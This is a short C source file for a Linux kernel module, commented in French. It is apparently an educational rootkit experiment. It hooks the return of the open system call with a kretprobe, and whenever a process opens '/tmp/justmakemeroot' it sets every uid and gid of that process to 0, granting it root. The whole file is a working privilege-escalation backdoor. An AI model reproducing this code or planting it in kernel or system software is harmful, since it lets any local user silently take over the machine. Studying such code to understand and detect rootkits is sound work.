/*
* Les KRETPROBES interceptent le retour de l'appel système
* (à la différence des kprobes simples, qui interceptent l'appel lui-même)
*
*/

#include "rootest.h"

int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs) 
{

  // __user indique que la mémoire pointée se trouve en userland (c'est juste indicatif)
  // regs->di récupère le premier argument de l'appel système intercepté en x86
  // Le typecast s'assure que la valeur retournée est un pointeur char dans le userland
  const char __user *filename = (const char __user *)regs->di;
  char fname[256];

  if (copy_from_user(fname, filename, sizeof(fname)) == 0) {
    if (strcmp(fname, "/tmp/justmakemeroot") == 0) {
      struct cred *new_creds;
      new_creds = prepare_kernel_cred(NULL);

      if (new_creds) {
        // Mise à jour les identifiants pour obtenir des privilèges root
        new_creds->uid.val = new_creds->gid.val = 0;
        new_creds->euid.val = new_creds->egid.val = 0;
        new_creds->suid.val = new_creds->sgid.val = 0;
        new_creds->fsuid.val = new_creds->fsgid.val = 0;

        commit_creds(new_creds);

      } else {
        printk(KERN_INFO "New creds is null\n");
      }
    }
  }

  return 0;
}

struct kretprobe rootkit_kretprobe = {
    .handler = ret_handler,
    .kp.symbol_name = "__x64_sys_open",
};
